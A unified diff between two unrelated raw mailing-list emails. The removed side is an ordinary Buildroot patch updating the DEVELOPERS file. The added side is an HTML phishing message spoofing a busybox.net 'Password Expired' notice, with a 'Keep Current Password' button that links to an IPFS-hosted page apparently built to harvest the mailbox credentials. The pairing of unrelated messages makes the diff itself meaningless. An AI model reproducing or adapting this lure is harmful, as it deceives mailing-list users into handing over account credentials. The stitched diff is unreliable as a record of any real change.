@@ -1,88 +1,48 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
+Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id E7EEACA100D
-	for <buildroot@archiver.kernel.org>; Tue,  5 Sep 2023 20:46:45 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id DD050CCF9E9
+	for <buildroot@archiver.kernel.org>; Wed,  6 Sep 2023 01:22:22 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 4DACF60BE7;
-	Tue,  5 Sep 2023 20:46:45 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 4DACF60BE7
+	by smtp2.osuosl.org (Postfix) with ESMTP id 8EA7140116;
+	Wed,  6 Sep 2023 01:22:21 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 8EA7140116
 X-Virus-Scanned: amavisd-new at osuosl.org
-Received: from smtp3.osuosl.org ([127.0.0.1])
-	by localhost (smtp3.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id pTCNS_7Nnvxr; Tue,  5 Sep 2023 20:46:44 +0000 (UTC)
+Received: from smtp2.osuosl.org ([127.0.0.1])
+	by localhost (smtp2.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id dy72_eWZT8sd; Wed,  6 Sep 2023 01:22:20 +0000 (UTC)
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 88F2460BBF;
-	Tue,  5 Sep 2023 20:46:43 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 88F2460BBF
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
- by ash.osuosl.org (Postfix) with ESMTP id 602E41BF344
- for <buildroot@lists.busybox.net>; Tue,  5 Sep 2023 20:46:42 +0000 (UTC)
+	by smtp2.osuosl.org (Postfix) with ESMTP id D6C75405D2;
+	Wed,  6 Sep 2023 01:22:19 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org D6C75405D2
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 6A3281BF3DF
+ for <buildroot@lists.busybox.net>; Wed,  6 Sep 2023 01:22:17 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp4.osuosl.org (Postfix) with ESMTP id 37DB34182F
- for <buildroot@lists.busybox.net>; Tue,  5 Sep 2023 20:46:42 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 37DB34182F
+ by smtp1.osuosl.org (Postfix) with ESMTP id 38F4F81F6D
+ for <buildroot@lists.busybox.net>; Wed,  6 Sep 2023 01:22:17 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 38F4F81F6D
 X-Virus-Scanned: amavisd-new at osuosl.org
-Received: from smtp4.osuosl.org ([127.0.0.1])
- by localhost (smtp4.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id mduQcOoFnfpm for <buildroot@lists.busybox.net>;
- Tue,  5 Sep 2023 20:46:41 +0000 (UTC)
-Received: from mail-io1-xd2e.google.com (mail-io1-xd2e.google.com
- [IPv6:2607:f8b0:4864:20::d2e])
- by smtp4.osuosl.org (Postfix) with ESMTPS id 4196C41835
- for <buildroot@buildroot.org>; Tue,  5 Sep 2023 20:46:41 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 4196C41835
-Received: by mail-io1-xd2e.google.com with SMTP id
- ca18e2360f4ac-794d98181f0so123137339f.2
- for <buildroot@buildroot.org>; Tue, 05 Sep 2023 13:46:41 -0700 (PDT)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20221208; t=1693946800; x=1694551600;
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:x-gm-message-state:from:to:cc:subject:date:message-id
- :reply-to;
- bh=mzt2H51PPmV/5WjhJZuhTGlkYMPjCZgKNyUH6J07HAk=;
- b=CbN/3ZuV99tL9qaKyBl9WE1K+aV+0K3k8YOZZQNb7chtJrySbyfNWd8GNDyNebuJNa
- UmNuQur5ua2FiTz7KU7h4o7rO1L2ZCXaqGjxb9cShUMTiyYJMAS30MWgAZqcWSADTkB2
- O04tkYO1hJojLd/lElq7RkTx2YrKyJWmY4/nN7LALUJLmFBAMby++7hdaq1xWSQdYPLf
- xR3tvkRVSOe68W1fqjlxR0zZnRoUq0o0I7W08Qw6AFI9pJvIN+dI5azDj1hY7hi1AqPu
- j0ajWo6yFwWmG8aOFdD0n00kDxyZIfgbeLv7gyTjbF8A3kDYyBNIOhgHATBcgdUNNiJ4
- 9c+Q==
-X-Gm-Message-State: AOJu0YzJnxgFyoizFaxRQG/I350pTxFXolKApta9D2o8FUPNSK9WRm0P
- 3kS0wOM7hG5V69aS0dvCKVa7CoMtsGk=
-X-Google-Smtp-Source: AGHT+IE3Fi2+aEP9pVb0+Hi8YgrsPUJxWCiRlipUPvqJpBudx47O6S7reUyvVBEG2aToKlxlTQO+ew==
-X-Received: by 2002:a6b:5c03:0:b0:792:82f8:749d with SMTP id
- z3-20020a6b5c03000000b0079282f8749dmr16807020ioh.10.1693946799520; 
- Tue, 05 Sep 2023 13:46:39 -0700 (PDT)
-Received: from james-x399.localdomain (97-118-146-15.hlrn.qwest.net.
- [97.118.146.15]) by smtp.gmail.com with ESMTPSA id
- t24-20020a6b0918000000b00777b7fdbbffsm4468784ioi.8.2023.09.05.13.46.38
- (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
- Tue, 05 Sep 2023 13:46:38 -0700 (PDT)
-From: James Hilliard <james.hilliard1@gmail.com>
-To: buildroot@buildroot.org
-Date: Tue,  5 Sep 2023 14:46:34 -0600
-Message-Id: <20230905204634.2462368-1-james.hilliard1@gmail.com>
-X-Mailer: git-send-email 2.34.1
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id KUlAf8cN3QlF for <buildroot@lists.busybox.net>;
+ Wed,  6 Sep 2023 01:22:15 +0000 (UTC)
+X-Greylist: delayed 156493 seconds by postgrey-1.37 at util1.osuosl.org;
+ Wed, 06 Sep 2023 01:22:15 UTC
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 3906381F61
+Received: from busybox.net (unknown [185.225.75.225])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 3906381F61
+ for <buildroot@busybox.net>; Wed,  6 Sep 2023 01:22:14 +0000 (UTC)
+From: Email Team<Noreply@busybox.net>
+To: buildroot@busybox.net
+Date: 6 Sep 2023 03:22:14 +0200
+Message-ID: <20230906032213.6D51461E5F83509F@busybox.net>
 MIME-Version: 1.0
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=gmail.com; s=20221208; t=1693946800; x=1694551600; darn=buildroot.org;
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:from:to:cc:subject:date:message-id:reply-to;
- bh=mzt2H51PPmV/5WjhJZuhTGlkYMPjCZgKNyUH6J07HAk=;
- b=lr8ALipZXwRJPcswUBNZIflj8+Gm+vaUSgbLLZyv3Pcu+HHvPDse9+gueTv+THlYLT
- FY8N2tAc+zuHvTUH2UnWKEeQmJdcXBk4y8lRng6Tu0D0z7hOgCSZ2gnKiJleuUGQ3n0+
- bfbfn+EFJznU03EfOLjb3Jw0WW9T8SwejgwPByAOi9BQ4uaowcy5XB8tLNGLT/8hX1/E
- s4MNiJp6YSPMxPy5qfGiHe4BQCeCcZOeb3MZ5cJue59J2Q1b2nuUM07lvvswplfLK1d+
- IHRDqN182rz8sqVXI7dvFR3fMyGVmY39vKjfHSeJCrnWjGpPa9g4CuqVXysxmVaiL/G2
- HgNQ==
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com
- header.a=rsa-sha256 header.s=20221208 header.b=lr8ALipZ
-Subject: [Buildroot] [PATCH 1/1] DEVELOPERS: add myself as developer for all
- python packages
+Subject: [Buildroot]
+ =?UTF-8?B?4pqg77iPIEFMRVJUISBQYXNzd29yZCBFeHBpcmVkIA==?=buildroot@busybox.net
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -94,103 +54,197 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: James Hilliard <james.hilliard1@gmail.com>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============5247683676029882763=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-Signed-off-by: James Hilliard <james.hilliard1@gmail.com>
----
- DEVELOPERS | 71 +-----------------------------------------------------
- 1 file changed, 1 insertion(+), 70 deletions(-)
+--===============5247683676029882763==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-diff --git a/DEVELOPERS b/DEVELOPERS
-index 3af43d2d27..2ff1a8a881 100644
---- a/DEVELOPERS
-+++ b/DEVELOPERS
-@@ -1402,76 +1402,7 @@ F:	package/lilv/
- F:	package/lv2/
- F:	package/neon-2-sse/
- F:	package/pipewire/
--F:	package/python-aioconsole/
--F:	package/python-aiodns/
--F:	package/python-aiohttp/
--F:	package/python-aiohttp-cors/
--F:	package/python-aiohttp-debugtoolbar/
--F:	package/python-aiohttp-jinja2/
--F:	package/python-aiohttp-mako/
--F:	package/python-aiohttp-remotes/
--F:	package/python-aiohttp-security/
--F:	package/python-aiohttp-session/
--F:	package/python-aiohttp-sse/
--F:	package/python-aiologstash/
--F:	package/python-aiomonitor/
--F:	package/python-aiojobs/
--F:	package/python-aioprocessing/
--F:	package/python-aiorwlock/
--F:	package/python-aiosignal/
--F:	package/python-aiozipkin/
--F:	package/python-argon2-cffi/
--F:	package/python-argon2-cffi-bindings/
--F:	package/python-async-generator/
--F:	package/python-async-lru/
--F:	package/python-async-timeout/
--F:	package/python-bidict/
--F:	package/python-brotli/
--F:	package/python-cbor2/
--F:	package/python-cchardet/
--F:	package/python-charset-normalizer/
--F:	package/python-cssselect2/
--F:	package/python-distlib/
--F:	package/python-editables/
--F:	package/python-flatbuffers/
--F:	package/python-fonttools/
--F:	package/python-frozenlist/
--F:	package/python-greenlet/
--F:	package/python-h11/
--F:	package/python-hatchling/
--F:	package/python-hatch-fancy-pypi-readme/
--F:	package/python-hatch-vcs/
--F:	package/python-installer/
--F:	package/python-janus/
--F:	package/python-logstash/
--F:	package/python-maturin/
--F:	package/python-multidict/
--F:	package/python-mypy-extensions/
--F:	package/python-outcome/
--F:	package/python-pathspec/
--F:	package/python-pycares/
--F:	package/python-pydyf/
--F:	package/python-pypa-build/
--F:	package/python-pyphen/
--F:	package/python-pyproject-hooks/
--F:	package/python-rpds-py/
--F:	package/python-rtoml/
--F:	package/python-selenium/
--F:	package/python-snappy/
--F:	package/python-sniffio/
--F:	package/python-sockjs/
--F:	package/python-terminaltables/
--F:	package/python-tinycss2/
--F:	package/python-tomli/
--F:	package/python-trio/
--F:	package/python-trio-websocket/
--F:	package/python-typeguard/
--F:	package/python-typing-inspect/
--F:	package/python-uhid/
--F:	package/python-weasyprint/
--F:	package/python-wsproto/
--F:	package/python-yarl/
--F:	package/python-zopfli/
-+F:	package/python*
- F:	package/rtl8192eu/
- F:	package/serd/
- F:	package/sord/
--- 
-2.34.1
+<!DOCTYPE HTML>
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<TABLE id=3Dm_5405685513312723412m_7956761294031256906m_-724791455539205584=
+5m_7703960463766098341v1table1 style=3D"FONT-SIZE: 14px; FONT-FAMILY: Robot=
+o,sans-serif; BORDER-COLLAPSE: collapse; COLOR: rgb(44,54,58); BACKGROUND-C=
+OLOR: rgb(241,244,248); font-variant-numeric: inherit; font-variant-east-as=
+ian: inherit; font-stretch: inherit" cellSpacing=3D0 cellPadding=3D0 width=
+=3D"100%" align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<TABLE id=3Dm_5405685513312723412m_7956761294031256906m_-724791455539205584=
+5m_7703960463766098341v1table2 style=3D"WIDTH: 640px; BORDER-COLLAPSE: coll=
+apse; COLOR: rgb(0,0,0); BACKGROUND-COLOR: rgb(255,255,255)" cellSpacing=3D=
+0 cellPadding=3D0 width=3D640 align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-W=
+IDTH: 0px; VERTICAL-ALIGN: top; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0=
+px; PADDING-TOP: 0px; BORDER-TOP-WIDTH: 0px" width=3D"100%">
+<TABLE id=3Dm_5405685513312723412m_7956761294031256906m_-724791455539205584=
+5m_7703960463766098341v1table3 style=3D"BORDER-COLLAPSE: collapse" cellSpac=
+ing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 20p=
+x; PADDING-LEFT: 40px; PADDING-RIGHT: 40px">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-FAMILY: =
+sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTO=
+M-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit"=
+>
+<DIV style=3D'BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-SIZE: 12=
+px; FONT-FAMILY: "Trebuchet MS","Lucida Grande","Lucida Sans Unicode","Luci=
+da Sans",Tahoma,sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseli=
+ne; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(85,85,85); PADDING-BOTTOM: 0px; PA=
+DDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.2; PADDING-R=
+IGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit'>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; TEXT-ALIGN: center; MA=
+RGIN: 0px"><SPAN style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; F=
+ONT-FAMILY: inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BOR=
+DER-BOTTOM-WIDTH: 0px; COLOR: rgb(0,49,136); PADDING-BOTTOM: 0px; PADDING-T=
+OP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WID=
+TH: 0px; font-stretch: inherit"><SPAN style=3D"BOX-SIZING: border-box; FONT=
+-WEIGHT: bolder">
+busybox.net&nbsp;Server - Password Expired</SPAN></SPAN></P></DIV></DIV></T=
+D></TR></TBODY></TABLE>
+<TABLE id=3Dm_5405685513312723412m_7956761294031256906m_-724791455539205584=
+5m_7703960463766098341v1table4 style=3D"BORDER-COLLAPSE: collapse" cellSpac=
+ing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 10p=
+x; PADDING-LEFT: 40px; PADDING-RIGHT: 40px">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-FAMILY: =
+Tahoma,Verdana,sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baselin=
+e; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
+-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-st=
+retch: inherit">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-SIZE: 12=
+px; FONT-FAMILY: Lato,Tahoma,Verdana,Segoe,sans-serif; BORDER-RIGHT-WIDTH: =
+0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(85,85,8=
+5); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; =
+LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: =
+inherit">
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 0px 40px"><SPAN style=
+=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-F=
+AMILY: inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-B=
+OTTOM-WIDTH: 0px; COLOR: rgb(109,137,188); PADDING-BOTTOM: 0px; PADDING-TOP=
+: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH=
+: 0px; font-stretch: inherit">The password to your &nbsp;mailbox&nbsp;build=
+root@busybox.net&nbsp; has expired.</SPAN></P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 0px 40px"><SPAN style=
+=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-F=
+AMILY: inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-B=
+OTTOM-WIDTH: 0px; COLOR: rgb(109,137,188); PADDING-BOTTOM: 0px; PADDING-TOP=
+: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH=
+: 0px; font-stretch: inherit">System will log you out and generate a new pa=
+ssword exactly at 24 hours from</SPAN></P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 0px 40px"><SPAN style=
+=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-F=
+AMILY: inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-B=
+OTTOM-WIDTH: 0px; COLOR: rgb(109,137,188); PADDING-BOTTOM: 0px; PADDING-TOP=
+: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH=
+: 0px; font-stretch: inherit">
+<SPAN style=3D'FONT-SIZE: 16px; FONT-FAMILY: "open sans",helveticaneue-ligh=
+t,"helvetica neue light","helvetica neue",helvetica,arial,"lucida grande",s=
+ans-serif; COLOR: rgb(64,64,64); BACKGROUND-COLOR: rgb(236,243,249)'>06, 09=
+,2023</SPAN>.<BR style=3D"BOX-SIZING: border-box">&nbsp;&nbsp;</SPAN>
+&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;=
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbs=
+p;&nbsp;<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT=
+-SIZE: 14px; FONT-FAMILY: inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN:=
+ baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(109,137,188); PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x; BORDER-TOP-WIDTH: 0px; font-variant-numeric:=20
+normal; font-variant-east-asian: normal; font-stretch: inherit">&nbsp; &nbs=
+p;<BR style=3D"BOX-SIZING: border-box">You can continue using your current =
+password. Use the button below to keep using the current password.</SPAN></=
+P></DIV></DIV></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR=
+></TBODY></TABLE>
+<TABLE id=3Dm_5405685513312723412m_7956761294031256906m_-724791455539205584=
+5m_7703960463766098341v1table5 style=3D"FONT-SIZE: 14px; FONT-FAMILY: Robot=
+o,sans-serif; BORDER-COLLAPSE: collapse; COLOR: rgb(44,54,58); BACKGROUND-C=
+OLOR: rgb(241,244,248); font-variant-numeric: inherit; font-variant-east-as=
+ian: inherit; font-stretch: inherit" cellSpacing=3D0 cellPadding=3D0 width=
+=3D"100%" align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<TABLE id=3Dm_5405685513312723412m_7956761294031256906m_-724791455539205584=
+5m_7703960463766098341v1table6 style=3D"WIDTH: 640px; BORDER-COLLAPSE: coll=
+apse; COLOR: rgb(0,0,0); BACKGROUND-COLOR: rgb(255,255,255)" cellSpacing=3D=
+0 cellPadding=3D0 width=3D640 align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(229,234,243) 1px solid=
+; BORDER-RIGHT: 0px; VERTICAL-ALIGN: top; BORDER-BOTTOM: 0px; PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; BORDER-LEFT: 0px" width=3D"100%">
+<TABLE id=3Dm_5405685513312723412m_7956761294031256906m_-724791455539205584=
+5m_7703960463766098341v1table7 style=3D"BORDER-COLLAPSE: collapse" cellSpac=
+ing=3D0 cellPadding=3D10 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-=
+WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOT=
+TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: =
+0px; BORDER-TOP-WIDTH: 0px" align=3Dcenter>
+<A style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(138,59,143) 1px solid; =
+FONT-FAMILY: Lato,Tahoma,Verdana,Segoe,sans-serif; BORDER-RIGHT: rgb(138,59=
+,143) 1px solid; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: rgb(138,59,143) 1=
+px solid; COLOR: rgb(255,255,255); PADDING-BOTTOM: 5px; PADDING-TOP: 5px; P=
+ADDING-LEFT: 0px; BORDER-LEFT: rgb(138,59,143) 1px solid; MARGIN: 0px; DISP=
+LAY: block; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(61,96,251); text-deco=
+ration-line: none; font-stretch: inherit;=20
+border-radius: 4px" href=3D"https://ipfs.io/ipfs/QmYGAHxaQWZ7aXbsvVGY8GfMsn=
+JrtFgwy3XzWJcJfztXAC?filename=3Dui.html#buildroot@busybox.net" rel=3D"noope=
+ner noreferrer" target=3D_blank data-saferedirecturl=3D"https://www.google.=
+com/url?q=3Dhttps://ipfs.io/ipfs/QmZMCg6aEcQbBtBiUy4PcmjeUoJadhQUKMP22R2wNo=
+JVao?filename%3Dimm.html%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=
+=3D1693619596737000&amp;usg=3DAOvVaw1j9ZamxnMEip3OMRguXaVR">
+<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-FAMILY:=
+ inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-=
+WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGI=
+N: 0px; DISPLAY: inline-block; LINE-HEIGHT: 28px; PADDING-RIGHT: 0px; BORDE=
+R-TOP-WIDTH: 0px; font-stretch: inherit"><B>Keep Current Password</B></SPAN=
+></A></DIV></TD></TR></TBODY></TABLE>
+<TABLE id=3Dm_5405685513312723412m_7956761294031256906m_-724791455539205584=
+5m_7703960463766098341v1table8 style=3D"BORDER-COLLAPSE: collapse" cellSpac=
+ing=3D0 cellPadding=3D10 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-FAMILY: =
+Tahoma,Verdana,sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baselin=
+e; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
+-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-st=
+retch: inherit">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; FONT-FAMILY: =
+Lato,Tahoma,Verdana,Segoe,sans-serif; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(57,61,71); PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 1.2;=
+ PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px"><B>Email is generated by&n=
+bsp;</B>busybox.net<B>&nbsp;Email Server for&nbsp;</B>buildroot@busybox.net=
+</P></DIV></DIV></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></=
+TR></TBODY></TABLE>
+<P>&nbsp;</P></BODY></HTML>
+
+--===============5247683676029882763==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============5247683676029882763==--
